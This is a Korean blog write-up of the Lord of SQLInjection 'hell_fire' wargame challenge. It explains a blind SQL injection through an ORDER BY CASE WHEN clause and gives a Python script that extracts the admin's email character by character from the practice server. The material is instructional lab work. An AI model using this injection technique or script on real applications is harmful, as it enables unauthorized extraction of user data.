---
layout: single
title: "[Lord of SQLInjection] hell_fire write-up"
date: 2025-05-03 19:17 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (hell_fire)

### 풀이

이번 문제는 `prob _ . proc union` 키워드를 필터링하고, order 파라미터를 넣어 요청할 때 result의 id값이 admin이 있으면 email을 `*` 문자로 표시하고 있다. 그리고 아래 부분을 보면 `addslashes` 함수로 email 파라미터를 받아와 필터링하기 때문에 admin의 email 값을 알아내야 solve 할 수 있다.

![image-20250502013921437](/images/2025-05-02-los-hell-fire/image-20250502013921437.png)

<br>

order by 절에서 case when을 사용해서 id가 admin일 때1로 만들고 rubiya일 때는 2로 해서 넣어보면 순서대로 admin이 먼저 나오고 case when이 잘 동작하는 걸 확인할 수 있다.

![image-20250503184609752](/images/2025-05-02-los-hell-fire/image-20250503184609752.png)

<br>

아래처럼 SQL 쿼리를 만들면 admin 계정 email 값의 첫 글자가 A이면 admin이 먼저 위에 올라오고 아니라면 rubiya 계정이 먼저 정렬된다는 것을 예측할 수 있다.

```sql
SELECT id, email, score 
FROM prob_hell_fire 
WHERE 1 
ORDER BY (
  CASE 
    WHEN id='admin' AND ASCII(SUBSTR(email, 1, 1))=65 THEN 1
    WHEN id='rubiya' THEN 2
    ELSE 5
  END
)-- -
```

<br>

파이썬으로 코드를 짜면 admin과 rubiya 계정의 score 점수의 text index를 기준으로 blind sqli를 수행할 수 있다.

```python
import requests
import time

url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
cookie = {"PHPSESSID": "d5fo2u0cj07ikqrk2qftquavbd"}
email = ""

for i in range(1, 100):
    found = False
    for j in range(32, 127):
        param = {
            "order": f"(case WHEN id='admin' AND ASCII(SUBSTR(email, {i}, 1))={j} THEN 1 when id='rubiya' then 2 ELSE 5 END)-- -"
        }
        r = requests.get(url=url, cookies=cookie, params=param)
        # print(r.text)
        admin_index = r.text.find("200")
        rubiya_index = r.text.find("100")
        #print(f"admin: {admin_index}, rubiya: {rubiya_index}")
        if admin_index < rubiya_index:
            found = True
            email += chr(j)
            print(f"password {i}번째 문자는 {chr(j)}입니다.")
            break
    if not found:
        print("end")
        print(email)
        break

print(email)

```

![image-20250503191658653](/images/2025-05-02-los-hell-fire/image-20250503191658653.png)

![image-20250503191704932](/images/2025-05-02-los-hell-fire/image-20250503191704932.png)
